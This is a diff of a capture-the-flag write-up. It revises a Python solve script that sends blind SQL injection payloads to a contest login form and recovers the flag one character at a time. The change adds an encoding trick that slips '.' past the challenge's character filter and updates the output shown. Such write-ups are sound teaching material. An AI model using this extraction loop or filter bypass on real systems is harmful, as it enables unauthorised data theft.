@@ -184,7 +184,8 @@ i = 1 # the index we're starting from
 while True:
     foundMatch = False # if we've found a match for this character
     for j in chars:
-        payload = payload1 + str(i) + payload2 + j + payload3 # the full payload we're sending
+        if j == '.': payload = payload1 + str(i) + payload2 + '\\x2e' + payload3 # make sure to circumvent the . filter!
+        else: payload = payload1 + str(i) + payload2 + j + payload3 # the full payload we're sending
         r = requests.post('http://litctf.live:31781/', data={'username':'', 'password':payload}) # send payload to main server
         if r.text.find("True") != -1:
             # we found the correct character!
@@ -224,18 +225,14 @@ Character at position 19 is j
 Character at position 20 is i
 Character at position 21 is _
 Character at position 22 is o
-```
-
-...but then the program suddenly stops, even though the flag is clearly not over!
-
-No worries, we can just skip over this character for now (by setting `i` to 24) and running the program again.
-
-```
+Character at position 23 is .
 Character at position 24 is 0
 Character at position 25 is }
 ```
 
-Now what about the missing character at position 23? Well, it turns out that our program has a bug in it, since `.` is a special character in SQL. Unfortunately, we weren't able to solve this issue in-contest, but with some guessing, we found the flag to be...
+...from which we can just read off our flag.
+
+*Fun fact:* In contest, we initially used `FIND` instead of `SUBSTR`. Also, we forgot to circumvent the `.` filter in the Python solve script. These two mistakes combined made us solve the problem about 24 hours later than we should have.
 
 ## Flag
 
